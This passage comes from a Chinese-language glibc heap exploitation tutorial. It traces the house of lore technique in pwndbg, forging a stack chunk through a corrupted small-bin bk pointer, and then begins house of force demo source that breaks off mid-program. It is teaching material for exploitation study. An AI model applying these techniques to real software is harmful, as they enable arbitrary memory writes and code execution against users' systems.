      fd_nextsize = 0x7fffffffe730,
      bk_nextsize = 0x2f7024547d2ca600
    }
第二次修改
    $7 = {
      prev_size = 0,
      size = 0,
      fd = 0x603000,
      bk = 0x7fffffffe600,
      fd_nextsize = 0x7fffffffe730,
      bk_nextsize = 0x2f7024547d2ca600
    }
    pwndbg> p stack_buffer_1
    $8 = {0x0, 0x0, 0x603000, 0x7fffffffe600}
现在分配了p5来避免free victim的时候被合并到top chunk中
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603460 PREV_INUSE {
      prev_size = 0,
      size = 134049,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
紧接着free掉了victim，此时我们的victim被放进了fast bin中
为什么是fast bin而不是程序中所说的unsorted bin这里我说一下，程序原本希望在32位机上测试的，但我的机子是64位的，100的chunk max_fast(64)因此被放入了unsorted bin中 )
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x603000 ◂— 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
现在就需要我们分配一个既不是unsorted bin又不是small bin的chunk了，一个超大的chunk会从top
chunk里分一块出来，然后系统会把unsorted bin中的chunk塞入属于他的bins中
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x7ffff7dd1bd8 ,
      bk = 0x7ffff7dd1bd8 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 {
      prev_size = 112,
      size = 1008,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603460 PREV_INUSE {
      prev_size = 0,
      size = 1217,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603920 PREV_INUSE {
      prev_size = 0,
      size = 132833,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    largebins
    empty
可以看到我们的victim已经被放到了small bins中，那么对为什么victim不在unsorted bin中却在small
bin中不了解的同学建议还是去看glibc内存管理的机制，这里我简单说一下
如果是32位机子会直接从unsorted bin中被扔进small bins，但是64位多了几个步骤
因为我们分配了1200的大内存，ptmalloc会先从fastbin中找，然后依次在unsorted bin,small
bin中查找看看有没有符合的chunk，因为我们没有符合的chunk，所以ptmalloc会把fastbin的chunk合并，然后放到unsorted
bin中，再从unsorted bin中查找，发现还是不符合，就会把unsorted
bin中的chunk放入属于他的bins中，此时我们的victim就被放进了small bin中了
好了，现在我们的victim已经被放到small bin中了，现在我们更改victim的bk指针指针，让他指向栈上
    pwndbg> x/10gx 0x603000
    0x603000:       0x0000000000000000      0x0000000000000071
    0x603010:       0x00007ffff7dd1bd8      0x00007fffffffe620
    0x603020:       0x0000000000000000      0x0000000000000000
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    pwndbg> p &stack_buffer_1
    $10 = (intptr_t *(*)[4]) 0x7fffffffe620
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70 [corrupted]
    FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    BK: 0x603000 —▸ 0x7fffffffe620 —▸ 0x7fffffffe600 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop
    largebins
    empty
可以看到我们已经伪造成功了，bk指针已经指到了我们的栈上
现在我们再申请一个victim一样大小的chunk,因为small bin是FIFO,所以头会被取出
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70 [corrupted]
    FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    BK: 0x7fffffffe620 —▸ 0x7fffffffe600 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop
    largebins
    empty
现在我们再申请一个chunk就可以取到栈上的chunk了
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70 [corrupted]
    FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    BK: 0x7fffffffe600 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop
    largebins
    empty
###  总结
程序首先在栈上定义了两个变量,stack_buffer_1[4],stack_buffer_2[3]
随后在栈上创建了一个fake chunk,将stack_buffer_1的fwd指针指向了victim_chunk
随后将stack_buffere_1的bk指针指向了stack_buffer_2,将stack_buffer_2的fwd指针指向了stack_buffer_1来绕过检查
之后为了将我们的victim放进我们的small bin中,申请一个超大的chunk
在victim被放进了small bin后,我们只需要覆盖victim的bk指针指向我们的stack_buffer_1即可
现在我们再分配一个大小为100的chunk,系统就会把victim返回给我们,但此时small bin中还有我们依旧伪造好的fake chunk
此时再分配就可以将我们的fake chunk拿出来了
## house of force
###  序
我们所说的house of force就是利用一个巨大的数来改写top chunk的size
这样就可以通过建立一个evil_size大小的chunk来使得我们的av->top指向我们想控制的地方
此时下一次分配就可以成功控制那块内存了
###  源代码
这里我也删了一些作者的话,加了一小点注释
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    //bss_var是我们要覆写的string
    char bss_var[] = "This is a string that we want to overwrite.";
    int main(int argc , char* argv[])
    {
            fprintf(stderr, "nWelcome to the House of Forcenn");
            //House of Force是覆写top chunk来分配任意内存地址的攻击方法
            fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.n");
            //top chunk是一个特殊的chunk,是内存中最后一块chunk,在向系统申请更多空间的情况下将会更改size的大小
            fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
                    "and is the chunk that will be resized when malloc asks for more space from the os.n");
            //在最后,我们将会使用这个方法来覆写bss_var的值
            fprintf(stderr, "nIn the end, we will use this to overwrite a variable at %p.n", bss_var);
            fprintf(stderr, "Its current value is: %sn", bss_var);
            //先分配一个chunk p1(256)
            fprintf(stderr, "nLet's allocate the first chunk, taking space from the wilderness.n");
            intptr_t *p1 = malloc(256);
            fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.n", p1 - 2);
            //现在堆由两个chunk组成,一个是我们分配的,另一个就是top chunk
            fprintf(stderr, "nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.n");
            int real_size = malloc_usable_size(p1);